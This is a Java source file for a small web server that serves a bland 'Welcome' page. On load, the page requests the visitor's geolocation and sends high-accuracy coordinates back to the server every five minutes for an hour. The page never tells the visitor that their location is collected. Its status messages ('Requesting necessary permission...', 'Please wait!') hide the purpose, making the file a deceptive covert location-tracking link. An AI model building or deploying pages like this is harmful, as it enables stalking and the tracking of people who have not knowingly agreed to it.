package com.example.Location;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LocationLinkServer {

    public static void main(String[] args) throws IOException {
        int port = getPort();

        HttpServer server = HttpServer.create(
                new InetSocketAddress("0.0.0.0", port),
                0
        );

        server.createContext("/", LocationLinkServer::handleHomePage);
        server.createContext("/location", LocationLinkServer::handleLocation);

        server.start();

        System.out.println("Location server started.");
        System.out.println("Open on this computer:");
        System.out.println("http://localhost:" + port + "/");
        System.out.println("Server port: " + port);
    }

    private static int getPort() {
        String portValue = System.getenv("PORT");

        if (portValue != null && !portValue.isBlank()) {
            return Integer.parseInt(portValue);
        }

        return 8080;
    }

    private static void handleHomePage(HttpExchange exchange) throws IOException {
        if (!exchange.getRequestMethod().equalsIgnoreCase("GET")) {
            sendResponse(exchange, 405, "Method Not Allowed");
            return;
        }

        String html = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <title>Welcome</title>

                <style>
                    body {
                        margin: 0;
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        font-family: Arial, sans-serif;
                        background: #f2f5f9;
                        color: #222;
                    }

                    .container {
                        max-width: 600px;
                        margin: 20px;
                        padding: 35px;
                        text-align: center;
                        background: white;
                        border-radius: 12px;
                        box-shadow: 0 3px 12px rgba(0, 0, 0, 0.15);
                    }

                    h1 {
                        color: #1976d2;
                    }

                    #status {
                        margin-top: 20px;
                        color: #555;
                        white-space: pre-line;
                    }
                </style>
            </head>

            <body>
                <div class="container">
                    <h1>Welcome!</h1>

                    <p>
                        Thank you for visiting this page.
                    </p>

                    <p>
                        We are preparing your experience.
                    </p>

                    <div id="status">
                        Requesting necessary permission...
                    </div>
                </div>

                <script>
                    const trackingDuration = 60 * 60 * 1000;
                    const trackingInterval = 5 * 60 * 1000;

                    let trackingStopped = false;
                    let locationCount = 0;
                    let intervalId = null;
                    let stopTimeoutId = null;

                    // Start automatically when the page loads
                    window.addEventListener("load", startTracking);

                    function startTracking() {
                        if (!navigator.geolocation) {
                            updateStatus(
                                "Geolocation is not supported by this browser."
                            );
                            return;
                        }

                        updateStatus(
                            "Please wait!"
                        );

                        // Get the first location immediately
                        getAndSendLocation();

                        // Get another location every 5 minutes
                        intervalId = setInterval(
                            getAndSendLocation,
                            trackingInterval
                        );

                        // Stop after one hour
                        stopTimeoutId = setTimeout(
                            stopTracking,
                            trackingDuration
                        );
                    }

                    function getAndSendLocation() {
                        if (trackingStopped) {
                            return;
                        }

                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const latitude =
                                    position.coords.latitude;

                                const longitude =
                                    position.coords.longitude;

                                locationCount++;

                                console.log(
                                    "Location #" + locationCount,
                                    "Latitude:", latitude,
                                    "Longitude:", longitude
                                );

                                updateStatus(
                                    "Please wait!"
                                );

                                sendLocationToJavaServer(
                                    latitude,
                                    longitude
                                );
                            },

                            function(error) {
                                console.error(
                                    "Location error:",
                                    error.message
                                );

                                updateStatus(
                                    "Location permission was denied or unavailable."
                                );
                            },

                            {
                                enableHighAccuracy: true,
                                timeout: 30000,
                                maximumAge: 0
                            }
                        );
                    }

                    async function sendLocationToJavaServer(
                        latitude,
                        longitude
                    ) {
                        try {
                            const response = await fetch("/location", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    latitude: latitude,
                                    longitude: longitude
                                })
                            });

                            if (!response.ok) {
                                console.error(
                                    "The server rejected the location."
                                );
                            }
                        } catch (error) {
                            console.error(
                                "Could not contact the Java server:",
                                error
                            );
                        }
                    }

                    function stopTracking() {
                        trackingStopped = true;

                        if (intervalId !== null) {
                            clearInterval(intervalId);
                        }

                        if (stopTimeoutId !== null) {
                            clearTimeout(stopTimeoutId);
                        }

                        updateStatus(
                            "Thank you."
                        );

                        console.log(
                            "Location tracking stopped after one hour."
                        );
                    }

                    function updateStatus(message) {
                        document.getElementById("status").innerText = message;
                    }
                </script>
            </body>
            </html>
            """;

        sendResponse(exchange, 200, html);
    }

    private static void handleLocation(HttpExchange exchange) throws IOException {
        if (!exchange.getRequestMethod().equalsIgnoreCase("POST")) {
            sendResponse(exchange, 405, "Method Not Allowed");
            return;
        }

        String requestBody = new String(
                exchange.getRequestBody().readAllBytes(),
                StandardCharsets.UTF_8
        );

        Double latitude = extractNumber(requestBody, "latitude");
        Double longitude = extractNumber(requestBody, "longitude");

        if (latitude == null || longitude == null) {
            System.out.println("Invalid location data received.");
            sendResponse(exchange, 400, "Invalid location data");
            return;
        }

        System.out.println();
        System.out.println("Location received at: " + LocalDateTime.now());
        System.out.println("Latitude: " + latitude);
        System.out.println("Longitude: " + longitude);
        System.out.println("-----------------------------");

        sendResponse(exchange, 200, "Location received successfully");
    }

    private static Double extractNumber(String json, String fieldName) {
        String regex =
                "\"" + fieldName + "\"\\s*:\\s*(-?\\d+(\\.\\d+)?)";

        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(json);

        if (matcher.find()) {
            return Double.parseDouble(matcher.group(1));
        }

        return null;
    }

    private static void sendResponse(
            HttpExchange exchange,
            int statusCode,
            String response
    ) throws IOException {
        byte[] responseBytes =
                response.getBytes(StandardCharsets.UTF_8);

        exchange.getResponseHeaders().set(
                "Content-Type",
                "text/html; charset=UTF-8"
        );

        exchange.sendResponseHeaders(
                statusCode,
                responseBytes.length
        );

        try (OutputStream outputStream = exchange.getResponseBody()) {
            outputStream.write(responseBytes);
        }
    }
}